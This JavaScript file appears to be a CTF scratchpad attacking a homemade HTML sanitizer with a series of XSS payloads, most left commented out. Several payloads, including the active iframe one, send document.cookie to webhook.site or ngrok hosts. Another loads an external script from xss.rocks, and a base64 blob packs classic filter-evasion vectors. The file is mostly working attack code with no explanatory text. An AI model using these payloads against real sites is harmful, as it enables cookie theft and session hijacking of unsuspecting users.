(async () => {
    //const content = "PElNRyBTUkM9Imphdglhc2NyaXB0OmFsZXJ0KCdYU1MnKTsiPgoKPGltZyBzcmM9aHR0cHM6Ly9tZWRpYS5naXBoeS5jb20vbWVkaWEvZDMxd0l1M0hnWTA0OE1Lcy9naXBoeS5naWYgd2lkdGg9NTk5IGhlaWdodD08U2NSaVB0PmFsZXJ0KDEpPC9TY1JpUHQ+PgoKPElOUFVUIFRZUEU9IklNQUdFIiBTUkM9ImphdmFzY3JpcHQ6YWxlcnQoJ1hTUycpOyI+CgoKPFNUWUxFPmxpIHtsaXN0LXN0eWxlLWltYWdlOiB1cmwoImphdmFzY3JpcHQ6YWxlcnQoJ1hTUycpIik7fTwvU1RZTEU+PFVMPjxMST5YU1M8L2JyPgoKPEJPRFkgT05MT0FEPWFsZXJ0KCdYU1MnKT4KCjxCUiBTSVpFPSIme2FsZXJ0KCdYU1MnKX0iPgoKZXhwLyo8QSBTVFlMRT0nbm9ceHNzOm5veHNzKCIqLy8qIik7CnhzczpleC8qWFNTKi8vKi8qL3ByZXNzaW9uKGFsZXJ0KCJYU1MiKSknPgoKPFNUWUxFIFRZUEU9InRleHQvamF2YXNjcmlwdCI+YWxlcnQoJ1hTUycpOzwvU1RZTEU+Cgo8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSk+CjxpbWcgc3JjPSJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKTsiPgo8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSkgLz4KCjxTVFlMRT4uWFNTe2JhY2tncm91bmQtaW1hZ2U6dXJsKCJqYXZhc2NyaXB0OmphdmFzY3JpcHQ6YWxlcnQoMSkiKTt9PC9TVFlMRT48QSBDTEFTUz1YU1M+PC9BPgoKPElNRyBTUkM9amF2YXNjcmlwdDpqYXZhc2NyaXB0OmFsZXJ0KDEpPgoKPElNRyBTUkM9JntqYXZhc2NyaXB0OmFsZXJ0KDEpO307PgoKPElNRyBTUkM9SmFWYVNjUmlQdDphbGVydCgnWFNTJyk+Cgo8SU1HIFNSQz0mI3g2QSYjeDYxJiN4NzYmI3g2MSYjeDczJiN4NjMmI3g3MiYjeDY5JiN4NzAmI3g3NCYjeDNBJiN4NjEmI3g2QyYjeDY1JiN4NzImI3g3NCYjeDI4JiN4MjcmI3g1OCYjeDUzJiN4NTMmI3gyNyYjeDI5PgoKPElNRyBTUkM9JiMxMDY7JiM5NzsmIzExODsmIzk3OyYjMTE1OyYjOTk7JiMxMTQ7JiMxMDU7JiMxMTI7JiMxMTY7JiM1ODsmIzk3OyYjMTA4OyYjMTAxOyYjMTE0OyYjMTE2OyYjNDA7CiYjMzk7JiM4ODsmIzgzOyYjODM7JiMzOTsmIzQxOz4KCjxJTUcgU1JDPSJqYXZhc2NyaXB0JiMwNTg7YWxlcnQoJ1hTUycpIj4KCjxpbWcgc3JjPT48U2NSaVB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L1NjUmlQdD4+";
    //const content = btoa("<img src=x width=<ScRiPt>alert(0)</ScRiPt>>");
    //const content = btoa("<IMG SRC=JaVaScRiPt:fetch('https://webhook.site/7e99c21c-2c26-43a2-9901-c7f570961bb5') WIDTH=`alert('XSS')`'>");
    //const content = btoa('<img src=><img src=x width=\"onerror height=alert(1)\">>')
    //const content = btoa('<img src="><img src=x onerror=alert(1)><">')
    //const content = btoa('<img src="><img src=\'\' onerror=\'alert(1)\'><">')
    //const content = btoa('<img src=" onerror="alert(1)">')
    //const payload = btoa('<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="194" height="200" id="xss"><script type="text/ecmascript">fetch("https://webhook.site/7e99c21c-2c26-43a2-9901-c7f570961bb5?cookie=".concat(document.cookie), {credentials:"include"});</script></svg>')
    //const content = btoa('<EMBED SRC="data:image/svg+xml;base64,' + payload + '" type="image/svg+xml" AllowScriptAccess="always"></EMBED>')
    //const content = btoa('<EMBED SRC="data:text/html,<script>fetch(\'https://webhook.site/7e99c21c-2c26-43a2-9901-c7f570961bb5?cookie=\'.concat(document.cookie));</script>" AllowScriptAccess="always"></EMBED>')
    //const content = btoa('<EMBED SRC="https://923a981d8ceb.ngrok.io">')
    //const content = btoa('<input type="hidden" accesskey="X" onclick="alert(1)">');
    //const content = btoa('<IMG SRC=xss onerror=fetch("https://923a981d8ceb.ngrok.io?cookie=".concat(document.cookie), {credentials:"include"})>')
    //const content = btoa('<img src=https://webhook.site/7e99c21c-2c26-43a2-9901-c7f570961bb5?cookie=alt alt=document.cookie <script>alert(0)</script>')
    //const content = btoa('<scr ipt src="https://34fc6abeb638.ngrok.io/xss.js"></sc ript>')
    const content = btoa("<IFRAME SRC='javascript:document.location=\"https://webhook.site/9e9464b8-2ded-47d7-bd9a-74d3c116b869?cookie=\"+document.cookie'></IFRAME>")
    console.log(content);
    //const content = btoa('<img src="><<Script>alert(1);<</Script><" width=expression(alert(1)) alt=" onload="alert(&apos;xss&apos;)> <!--><SCRIPT>alert(1);</SCRIPT><-->')
    //const content = btoa("<sCr\0IpT SRC=http://xss.rocks/xss.js></sCr\0IpT>");
    //const content = btoa('<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>')
    display(atob(content));
    //fetch("https://static-static-hosting.2020.redpwnc.tf").then(function(response) { return fetch("https://923a981d8ceb.ngrok.io?cookie=".concat(response.json())), {credentials:"include"}});
})();

function display(input) {
    document.documentElement.innerHTML = clean(input);
    console.log(clean(input));
}

function clean(input) {
    const template = document.createElement('template');
    const html = document.createElement('html');
    template.content.appendChild(html);
    html.innerHTML = input;

    sanitize(html);

    const result = html.innerHTML;
    return result;
}

function sanitize(element) {
    const attributes = element.getAttributeNames();
    for (let i = 0; i < attributes.length; i++) {
        console.log("Attribute is ", attributes[i]);
        // Let people add images and styles
        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
            element.removeAttribute(attributes[i]);
        }
    }

    const children = element.children;
    for (let i = 0; i < children.length; i++) {
        console.log("Chidren are", children[i], children[i].nodeName);
        if (children[i].nodeName === 'SCRIPT') {
            element.removeChild(children[i]);
            i --;
        } else {
            sanitize(children[i]);
        }
    }
}
